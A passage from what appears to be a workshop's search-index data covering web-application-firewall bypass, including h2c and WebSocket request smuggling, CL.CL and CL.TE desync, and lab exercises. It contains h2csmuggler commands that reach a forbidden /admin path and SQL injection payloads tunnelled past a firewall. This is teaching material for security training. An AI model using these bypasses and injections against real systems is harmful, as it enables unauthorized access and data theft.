[INFO] h2c stream established successfully. [INFO] Success! https://127.0.0.1:8002 can be used for tunneling","title":"Validation"},{"location":"04-lab/#accessing-forbidden-path","text":"> python .\\h2csmuggler.py -x https://nsec2022.xss.lol:8443/ \"https://localhost:8443/admin\"","title":"Accessing Forbidden Path"},{"location":"04-lab/#sqli-exploitation","text":"When testing for SQL injection, a tester will be blocked right away by the Web Application Firewall in place. http://127.0.0.1/movie?id=1' (see single quote at the end) We can use the HTTP2 technique to establish an HTTP tunnel with the application directly that will not be interpreted by most proxies. > python h2csmuggler.py -x https://127.0.0.1:8443 \"http://127.0.0.1/movie?id=1'\" [INFO] h2c stream established successfully. :status: 200 [...] [INFO] Requesting - /movie?id=1' [...] python h2csmuggler.py -x https://127.0.0.1:8443 \"https://127.0.0.1/?genre=action' or ''='\" [INFO] h2c stream established successfully. :status: 200 [...] [INFO] Requesting - /?genre=action' or ''=' [...] Can you extract the version of MySQL used by the backend application?","title":"SQLi Exploitation"},{"location":"04-switching-protocol/","text":"Switching Protocol Material WebSocket HRS WebSocket communication is full-duplex communication that takes place inside a HTTP/1. While typical HTTP/1 messages can be sent in full-duplex, classic HTTP require all messages to have a headers and body section. WebSocket allows lightweight communication along with the control over the Socket with Javascript. WebSocket handshake Request Smuggling opportunity It would not be possible to pass an HTTP/1 request once the WebSocket protocol has been established. Once the upgrade is done the receiving application will see incoming traffic as bytes. (Add note regarding encryption) It is however possible to initiate an incomplete Upgrade request that would fail. If the proxy has a \"naive\" WebSocket support implementation, it will not at the server response to evaluate if the upgrade succeeds. Using this request fails, it is now possible to pass an additional request to the server. Since it is not in WebSocket mode, it will process the following byte stream as normal HTTP/1. Status code validation Although not all proxies will validate that the upgrade was successful, the most common proxies such as NGINX will be validating the response based on its status code. For those systems, the attack is only effective if an attacker can force a response code to 101 with initiating an actual WebSocket communication. Mikhail Egorov describe the scenario were a proxy endpoint would make a request to external systems and return the status code from those exchange. If the attacker can control the destination, he could indeed force the status code to 101. References: Smuggling HTTP requests over fake WebSocket connection by 0ang3el HTTP/1 Upgrade to HTTP/2 cleartext HTTP 2 Cleartext, shorten to h2c, is the protocol upgrade a connection from HTTP version 1 to HTTP version 2. The operation is done without closing the TCP socket. HTTP 2 Handshake Sequence HTTP/2 Cleartext handshake Potential abuses Just like the technique with the WebSocket upgrade, it is possible to create a request that will not be analyzed by the load balancer. Any special processing such as URL filtering could be bypassed. It can also be an opportunity for an attacker to bypass a Web Application Firewall. We are going to this scenario in practice in the fourth exercise. References: h2c Smuggling by Jake Miller (BishopFox) H2C Smuggling in the Wild by Sean Yeoh (AssetNote) H2C smuggling proves effective against Azure, Cloudflare Access, and more from DailySwig","title":"Switching Protocol Material"},{"location":"04-switching-protocol/#switching-protocol-material","text":"","title":"Switching Protocol Material"},{"location":"04-switching-protocol/#websocket-hrs","text":"WebSocket communication is full-duplex communication that takes place inside a HTTP/1. While typical HTTP/1 messages can be sent in full-duplex, classic HTTP require all messages to have a headers and body section. WebSocket allows lightweight communication along with the control over the Socket with Javascript. WebSocket handshake","title":"WebSocket HRS"},{"location":"04-switching-protocol/#request-smuggling-opportunity","text":"It would not be possible to pass an HTTP/1 request once the WebSocket protocol has been established. Once the upgrade is done the receiving application will see incoming traffic as bytes. (Add note regarding encryption) It is however possible to initiate an incomplete Upgrade request that would fail. If the proxy has a \"naive\" WebSocket support implementation, it will not at the server response to evaluate if the upgrade succeeds. Using this request fails, it is now possible to pass an additional request to the server. Since it is not in WebSocket mode, it will process the following byte stream as normal HTTP/1.","title":"Request Smuggling opportunity"},{"location":"04-switching-protocol/#status-code-validation","text":"Although not all proxies will validate that the upgrade was successful, the most common proxies such as NGINX will be validating the response based on its status code. For those systems, the attack is only effective if an attacker can force a response code to 101 with initiating an actual WebSocket communication. Mikhail Egorov describe the scenario were a proxy endpoint would make a request to external systems and return the status code from those exchange. If the attacker can control the destination, he could indeed force the status code to 101. References: Smuggling HTTP requests over fake WebSocket connection by 0ang3el","title":"Status code validation"},{"location":"04-switching-protocol/#http1-upgrade-to-http2-cleartext","text":"HTTP 2 Cleartext, shorten to h2c, is the protocol upgrade a connection from HTTP version 1 to HTTP version 2. The operation is done without closing the TCP socket.","title":"HTTP/1 Upgrade to HTTP/2 cleartext"},{"location":"04-switching-protocol/#http-2-handshake-sequence","text":"HTTP/2 Cleartext handshake","title":"HTTP 2 Handshake Sequence"},{"location":"04-switching-protocol/#potential-abuses","text":"Just like the technique with the WebSocket upgrade, it is possible to create a request that will not be analyzed by the load balancer. Any special processing such as URL filtering could be bypassed. It can also be an opportunity for an attacker to bypass a Web Application Firewall. We are going to this scenario in practice in the fourth exercise. References: h2c Smuggling by Jake Miller (BishopFox) H2C Smuggling in the Wild by Sean Yeoh (AssetNote) H2C smuggling proves effective against Azure, Cloudflare Access, and more from DailySwig","title":"Potential abuses"},{"location":"05-lab/","text":"Request Smuggling Lab","title":"Request Smuggling Lab"},{"location":"05-lab/#request-smuggling-lab","text":"","title":"Request Smuggling Lab"},{"location":"05-request-smuggling/","text":"Request Smuggling Material HTTP/1.1 CL.CL Duplicate Content-Length (CL.CL) The first edge case that was documented was the use of two Content-Length headers with conflicting values. This cause issue when the proxy and the backend do not use the same value. How can this be possible? Because the parsers are implemented differently, one implementation might keep the last seen header while an other could keep the first one. Implementation where the last value is kept headers = {} for line : httpRequest parts = line . split ( \":\" ) headers [ parts [ 0 ]] = parts [ 1 ] Implementation where the first value is kept headers = {} for line : httpRequest parts = line . split ( \":\" ) if ( parts [ 0 ] not in headers ): #Does not override existing value headers [ parts [ 0 ]] = parts [ 1 ] What each party sees in a CL.CL attack The proxy use the first header: The backend application use the last header: There is more... This scenario is probably the easiest to understand. This is why it was presented first. However, the length of the request is not defined only by Content-Length . HTTP has evolved greatly and has multiple headers that cover similar features. HTTP/1.1 CL.TE HTTP/1.1 Content-Length Transfer-Encoding (CL.TE) Content-Length is not the only one that can be used in an HTTP/1.1 request. Chunked encoding From the doc \u201cChunked encoding is useful when larger amounts of data are sent to the client and the total size of the response may not be known until the request has been fully processed.\u201d Ref: Mozilla.org: Transfer-Encoding It can be used to serve large files generated on the fly. An example can be seen below. The length is in hexadecimal followed by the bytes \"chunk\". HTTP/1.1 200 OK Content-Type : text/plain Transfer-Encoding : chunked 5\\r\\n Hello\\r\\n 8\\r\\n NorthSec\\r\\n B\\r\\n Conference!\\r\\n 0\\r\\n \\r\\n The same transfer-encoding type can be used to format the request. POST /index.php HTTP/1.1 Host : myapp.com Transfer-Encoding : chunked 5\\r\\n Hello\\r\\n 8\\r\\n NorthSec\\r\\n B\\r\\n Conference!\\r\\n 0\\r\\n \\r\\n Content-Length vs Transfer-Encoding The server now has an additional dilemma if both Content-Length and Transfer-Encoding are present. Which one should be used? Luckily, the HTTP/1.1 RFC is describing the expected scenario. From the RFC \u201cIf a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.\u201d Ref: RFC2616 - HTTP/1.1 Transfer-Encoding must be used instead of Content-Length. However Transfer-Encoding might not be supported by both services. In 2021, that would be a major oversight.","title":"Request Smuggling Material"},{"location":"05-request-smuggling/#request-smuggling-material","text":"","title":"Request Smuggling Material"},{"location":"05-request-smuggling/#http11-clcl","text":"","title":"HTTP/1.1 CL.CL"},{"location":"05-request-smuggling/#duplicate-content-length-clcl","text":"The first edge case that was documented was the use of two Content-Length headers with conflicting values. This cause issue when the proxy and the backend do not use the same value. How can this be possible? Because the parsers are implemented differently, one implementation might keep the last seen header while an other could keep the first one. Implementation where the last value is kept headers = {} for line : httpRequest parts = line . split ( \":\" ) headers [ parts [ 0 ]] = parts [ 1 ] Implementation where the first value is kept headers = {} for line : httpRequest parts = line . split ( \":\" ) if ( parts [ 0 ] not in headers ): #Does not override existing value headers [ parts [ 0 ]] = parts [ 1 ]","title":"Duplicate Content-Length (CL.CL)"},{"location":"05-request-smuggling/#what-each-party-sees-in-a-clcl-attack","text":"The proxy use the first header: The backend application use the last header:","title":"What each party sees in a CL.CL attack"},{"location":"05-request-smuggling/#there-is-more","text":"This scenario is probably the easiest to understand. This is why it was presented first. However, the length of the request is not defined only by Content-Length . HTTP has evolved greatly and has multiple headers that cover similar features.","title":"There is more..."},{"location":"05-request-smuggling/#http11-clte","text":"","title":"HTTP/1.1 CL.TE"},{"location":"05-request-smuggling/#http11-content-length-transfer-encoding-clte","text":"Content-Length is not the only one that can be used in an HTTP/1.1 request.","title":"HTTP/1.1 Content-Length Transfer-Encoding (CL.TE)"},{"location":"05-request-smuggling/#chunked-encoding","text":"From the doc \u201cChunked encoding is useful when larger amounts of data are sent to the client and the total size of the response may not be known until the request has been fully processed.\u201d Ref: Mozilla.org: Transfer-Encoding It can be used to serve large files generated on the fly. An example can be seen below. The length is in hexadecimal followed by the bytes \"chunk\". HTTP/1.1 200 OK Content-Type : text/plain Transfer-Encoding : chunked 5\\r\\n Hello\\r\\n 8\\r\\n NorthSec\\r\\n B\\r\\n Conference!\\r\\n 0\\r\\n \\r\\n The same transfer-encoding type can be used to format the request. POST /index.php HTTP/1.1 Host : myapp.com Transfer-Encoding : chunked 5\\r\\n Hello\\r\\n 8\\r\\n NorthSec\\r\\n B\\r\\n Conference!\\r\\n 0\\r\\n \\r\\n","title":"Chunked encoding"},{"location":"05-request-smuggling/#content-length-vs-transfer-encoding","text":"The server now has an additional dilemma if both Content-Length and Transfer-Encoding are present. Which one should be used? Luckily, the HTTP/1.1 RFC is describing the expected scenario. From the RFC \u201cIf a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.\u201d Ref: RFC2616 - HTTP/1.1 Transfer-Encoding must be used instead of Content-Length. However Transfer-Encoding might not be supported by both services. In 2021, that would be a major oversight.","title":"Content-Length vs Transfer-Encoding"},{"location":"conclusion/","text":"Conclusion This is the end of the workshop! Congratulations if you manage to reproduce most of the exercises. General Principles Remember that this presentation was not a exhaustive list of patterns but, an attempt to do a overview at the most common bypass patterns. We saw that transformations (decoding, nested encoding and replacement) done server-side could allow numerous variation on the same request. Finding such transformation can oriented the technique to used. Parsers implementation differences between the web application and the firewall are a common trait of bypass. Suggested Presentations Breaking Parser Logic! Take Your Path Normalization Off and Pop 0days Out by Orange Tsai SQLi Optimization and Obfuscation Techniques by Roberto Salgado Farewell, WAF - Exploiting SQL Injection from Mutation to Polymorphism by Boik Su","title":"Conclusion"},{"location":"conclusion/#conclusion","text":"This is the end of the workshop! Congratulations if you manage to reproduce most of the exercises.","title":"Conclusion"},{"location":"conclusion/#general-principles","text":"Remember that this presentation was not a exhaustive list of patterns but, an attempt to do a overview at the most common bypass patterns. We saw that transformations (decoding, nested encoding and replacement) done server-side could allow numerous variation on the same request. Finding such transformation can oriented the technique to used. Parsers implementation differences between the web application and the firewall are a common trait of bypass.","title":"General Principles"},{"location":"conclusion/#suggested-presentations","text":"Breaking Parser Logic! Take Your Path Normalization Off and Pop 0days Out by Orange Tsai SQLi Optimization and Obfuscation Techniques by Roberto Salgado Farewell, WAF - Exploiting SQL Injection from Mutation to Polymorphism by Boik Su","title":"Suggested Presentations"},{"location":"waf/","text":"What is a WAF? Context In a typical scalable web infrastructure, a proxy will place in front of the backend. The proxy is forwarding a request to the backend. It can be load balancer, a caching server or simply a reverse proxy. A firewall functionnality can be enable on each of those. Purpose The purpose of the Web Application Firewall is to filters, monitors, and blocks incoming and/or outgoing HTTP traffic. Analysis of incoming traffic can be to identify attack patterns to block or logged those. Vendors There are numerous WAF software that can be used. Many of those are included in cloud infrastructure. The two main open-source projects are modsecurity and naxsi .","title":"What is a WAF?"},{"location":"waf/#what-is-a-waf","text":"","title":"What is a WAF?"},{"location":"waf/#context","text":"In a typical scalable web infrastructure, a proxy will place in front of the backend. The proxy is forwarding a request to the backend. It can be load balancer, a caching server or simply a reverse proxy. A firewall functionnality can be enable on each of those.","title":"Context"},{"location":"waf/#purpose","text":"The purpose of the Web Application Firewall is to filters, monitors, and blocks incoming and/or outgoing HTTP traffic. Analysis of incoming traffic can be to identify attack patterns to block or logged those.","title":"Purpose"},{"location":"waf/#vendors","text":"There are numerous WAF software that can be used. Many of those are included in cloud infrastructure. The two main open-source projects are modsecurity and naxsi .","title":"Vendors"}]}